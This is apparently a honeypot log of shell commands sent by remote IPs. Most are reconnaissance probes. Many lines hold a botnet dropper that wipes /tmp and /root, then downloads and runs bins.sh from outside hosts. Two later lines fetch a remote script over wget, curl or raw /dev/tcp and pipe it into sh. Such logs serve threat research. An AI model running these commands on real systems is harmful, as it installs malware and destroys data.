+2024-11-18 15:11:38.692146 - ('157.230.116.150', 60280) - uptime -p
+2024-11-18 15:11:38.823255 - ('157.230.116.150', 60280) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 15:11:39.044685 - ('157.230.116.150', 60280) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 15:15:40.990092 - ('37.44.238.68', 32866) - whoami
+2024-11-18 15:15:42.432741 - ('37.44.238.68', 32850) - whoami
+2024-11-18 15:15:43.896599 - ('37.44.238.68', 32868) - whoami
+2024-11-18 15:15:45.485484 - ('37.44.238.68', 32896) - whoami
+2024-11-18 15:15:46.967557 - ('37.44.238.68', 32902) - whoami
+2024-11-18 15:15:48.597099 - ('37.44.238.68', 32862) - whoami
+2024-11-18 15:15:50.774527 - ('37.44.238.68', 32844) - whoami
+2024-11-18 15:15:52.450980 - ('37.44.238.68', 32880) - whoami
+2024-11-18 15:15:53.830599 - ('37.44.238.68', 32910) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:15:55.337684 - ('37.44.238.68', 32916) - whoami
+2024-11-18 15:15:56.902832 - ('37.44.238.68', 32926) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:15:57.986018 - ('37.44.238.68', 33004) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:15:59.211008 - ('37.44.238.68', 33018) - whoami
+2024-11-18 15:16:00.259094 - ('37.44.238.68', 33030) - whoami
+2024-11-18 15:16:01.748902 - ('37.44.238.68', 44848) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:02.855871 - ('37.44.238.68', 44860) - whoami
+2024-11-18 15:16:03.569643 - ('37.44.238.68', 44862) - whoami
+2024-11-18 15:16:05.591528 - ('37.44.238.68', 44868) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:06.411853 - ('37.44.238.68', 44872) - whoami
+2024-11-18 15:16:07.625273 - ('37.44.238.68', 44884) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:09.210573 - ('37.44.238.68', 33034) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:11.080814 - ('37.44.238.68', 44886) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:12.328987 - ('37.44.238.68', 44896) - whoami
+2024-11-18 15:16:13.525407 - ('37.44.238.68', 44900) - whoami
+2024-11-18 15:16:14.163501 - ('37.44.238.68', 44916) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:16.093604 - ('37.44.238.68', 56464) - whoami
+2024-11-18 15:16:17.369035 - ('37.44.238.68', 56474) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:17.478676 - ('37.44.238.68', 56472) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:19.673548 - ('37.44.238.68', 56500) - whoami
+2024-11-18 15:16:20.460113 - ('37.44.238.68', 56478) - whoami
+2024-11-18 15:16:22.894687 - ('37.44.238.68', 56504) - whoami
+2024-11-18 15:16:25.203228 - ('37.44.238.68', 56490) - whoami
+2024-11-18 15:16:27.062378 - ('37.44.238.68', 56480) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:27.610091 - ('37.44.238.68', 38116) - whoami
+2024-11-18 15:16:28.525163 - ('37.44.238.68', 38110) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:30.478224 - ('37.44.238.68', 38132) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:32.375852 - ('37.44.238.68', 38042) - whoami
+2024-11-18 15:16:32.576391 - ('37.44.238.68', 38162) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:32.869073 - ('37.44.238.68', 38146) - whoami
+2024-11-18 15:16:33.470521 - ('37.44.238.68', 38158) - whoami
+2024-11-18 15:16:33.878592 - ('37.44.238.68', 38106) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:34.770383 - ('37.44.238.68', 38088) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:35.337549 - ('37.44.238.68', 38112) - whoami
+2024-11-18 15:16:36.138645 - ('37.44.238.68', 38108) - whoami
+2024-11-18 15:16:36.223872 - ('37.44.238.68', 38136) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:36.804216 - ('37.44.238.68', 38148) - whoami
+2024-11-18 15:16:37.648257 - ('37.44.238.68', 38164) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:38.528365 - ('37.44.238.68', 35740) - whoami
+2024-11-18 15:16:39.374710 - ('37.44.238.68', 35758) - whoami
+2024-11-18 15:16:39.502412 - ('37.44.238.68', 38124) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:40.825424 - ('37.44.238.68', 35746) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:42.603892 - ('37.44.238.68', 35780) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:43.472522 - ('37.44.238.68', 35770) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:44.741392 - ('37.44.238.68', 35802) - whoami
+2024-11-18 15:16:45.924804 - ('37.44.238.68', 35816) - whoami
+2024-11-18 15:16:46.962792 - ('37.44.238.68', 35826) - whoami
+2024-11-18 15:16:48.061994 - ('37.44.238.68', 37290) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:48.950868 - ('37.44.238.68', 37300) - whoami
+2024-11-18 15:16:49.881937 - ('37.44.238.68', 37304) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:50.966137 - ('37.44.238.68', 35790) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:52.890216 - ('37.44.238.68', 37320) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:53.607978 - ('37.44.238.68', 37334) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:55.170902 - ('37.44.238.68', 37350) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:55.887490 - ('37.44.238.68', 37366) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:56.955251 - ('37.44.238.68', 55920) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:16:58.938147 - ('37.44.238.68', 55934) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:17:00.980449 - ('37.44.238.68', 55948) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-18 15:38:12.820866 - ('157.230.116.150', 58890) - uname -a
+2024-11-18 15:38:13.067596 - ('157.230.116.150', 58890) - uname -m
+2024-11-18 15:38:13.201756 - ('157.230.116.150', 58890) - nproc
+2024-11-18 15:38:13.424981 - ('157.230.116.150', 58890) - uptime -p
+2024-11-18 15:38:13.559580 - ('157.230.116.150', 58890) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 15:38:13.781588 - ('157.230.116.150', 58890) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 16:04:50.039707 - ('157.230.116.150', 57462) - uname -a
+2024-11-18 16:04:50.285220 - ('157.230.116.150', 57462) - uname -m
+2024-11-18 16:04:50.420121 - ('157.230.116.150', 57462) - nproc
+2024-11-18 16:04:50.637085 - ('157.230.116.150', 57462) - uptime -p
+2024-11-18 16:04:50.769902 - ('157.230.116.150', 57462) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 16:04:50.990910 - ('157.230.116.150', 57462) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 16:31:25.386597 - ('157.230.116.150', 56072) - uname -a
+2024-11-18 16:31:25.644550 - ('157.230.116.150', 56072) - uname -m
+2024-11-18 16:31:25.807326 - ('157.230.116.150', 56072) - nproc
+2024-11-18 16:31:26.029079 - ('157.230.116.150', 56072) - uptime -p
+2024-11-18 16:31:26.160598 - ('157.230.116.150', 56072) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 16:31:26.377582 - ('157.230.116.150', 56072) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 16:58:10.839543 - ('157.230.116.150', 54666) - uname -a
+2024-11-18 16:58:11.075007 - ('157.230.116.150', 54666) - uname -m
+2024-11-18 16:58:11.196328 - ('157.230.116.150', 54666) - nproc
+2024-11-18 16:58:11.407284 - ('157.230.116.150', 54666) - uptime -p
+2024-11-18 16:58:11.529300 - ('157.230.116.150', 54666) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 16:58:11.735487 - ('157.230.116.150', 54666) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 17:24:53.441570 - ('157.230.116.150', 53304) - uname -a
+2024-11-18 17:24:53.725601 - ('157.230.116.150', 53304) - uname -m
+2024-11-18 17:24:53.888255 - ('157.230.116.150', 53304) - nproc
+2024-11-18 17:24:54.133592 - ('157.230.116.150', 53304) - uptime -p
+2024-11-18 17:24:54.293398 - ('157.230.116.150', 53304) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 17:24:54.533298 - ('157.230.116.150', 53304) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 17:51:36.851012 - ('157.230.116.150', 51930) - uname -a
+2024-11-18 17:51:37.084478 - ('157.230.116.150', 51930) - uname -m
+2024-11-18 17:51:37.206231 - ('157.230.116.150', 51930) - nproc
+2024-11-18 17:51:37.413636 - ('157.230.116.150', 51930) - uptime -p
+2024-11-18 17:51:37.540685 - ('157.230.116.150', 51930) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 17:51:37.745744 - ('157.230.116.150', 51930) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 18:18:29.297336 - ('157.230.116.150', 50508) - uname -a
+2024-11-18 18:18:29.543021 - ('157.230.116.150', 50508) - uname -m
+2024-11-18 18:18:29.675240 - ('157.230.116.150', 50508) - nproc
+2024-11-18 18:18:29.907017 - ('157.230.116.150', 50508) - uptime -p
+2024-11-18 18:18:30.038233 - ('157.230.116.150', 50508) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 18:18:30.259622 - ('157.230.116.150', 50508) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 18:45:03.040384 - ('157.230.116.150', 49096) - uname -a
+2024-11-18 18:45:03.271539 - ('157.230.116.150', 49096) - uname -m
+2024-11-18 18:45:03.391612 - ('157.230.116.150', 49096) - nproc
+2024-11-18 18:45:03.600194 - ('157.230.116.150', 49096) - uptime -p
+2024-11-18 18:45:03.760702 - ('157.230.116.150', 49096) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 18:45:03.971818 - ('157.230.116.150', 49096) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 19:11:47.192090 - ('157.230.116.150', 47664) - uname -a
+2024-11-18 19:11:47.355081 - ('157.230.116.150', 47664) - uname -m
+2024-11-18 19:11:47.515460 - ('157.230.116.150', 47664) - nproc
+2024-11-18 19:11:47.679418 - ('157.230.116.150', 47664) - uptime -p
+2024-11-18 19:11:47.840004 - ('157.230.116.150', 47664) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 19:11:48.003202 - ('157.230.116.150', 47664) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 19:38:17.483877 - ('157.230.116.150', 46252) - uname -a
+2024-11-18 19:38:17.612113 - ('157.230.116.150', 46252) - uname -m
+2024-11-18 19:38:17.816765 - ('157.230.116.150', 46252) - nproc
+2024-11-18 19:38:17.936005 - ('157.230.116.150', 46252) - uptime -p
+2024-11-18 19:38:18.143327 - ('157.230.116.150', 46252) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 19:38:18.263483 - ('157.230.116.150', 46252) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 20:04:56.677632 - ('157.230.116.150', 44878) - uname -a
+2024-11-18 20:04:56.857195 - ('157.230.116.150', 44878) - uname -m
+2024-11-18 20:04:57.140279 - ('157.230.116.150', 44878) - nproc
+2024-11-18 20:04:57.320932 - ('157.230.116.150', 44878) - uptime -p
+2024-11-18 20:04:57.493360 - ('157.230.116.150', 44878) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 20:04:57.675084 - ('157.230.116.150', 44878) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 20:13:24.287202 - ('87.120.113.231', 33796) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-18 20:31:35.456044 - ('157.230.116.150', 43498) - uname -a
+2024-11-18 20:31:35.625651 - ('157.230.116.150', 43498) - uname -m
+2024-11-18 20:31:35.788862 - ('157.230.116.150', 43498) - nproc
+2024-11-18 20:31:35.951518 - ('157.230.116.150', 43498) - uptime -p
+2024-11-18 20:31:36.118835 - ('157.230.116.150', 43498) - nvidia-smi -q | grep 'Product Name'
+2024-11-18 20:31:36.283711 - ('157.230.116.150', 43498) - lspci | grep -i 'vga\|display' | grep -i 'amd'
+2024-11-18 20:35:17.808756 - ('87.120.113.231', 48674) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
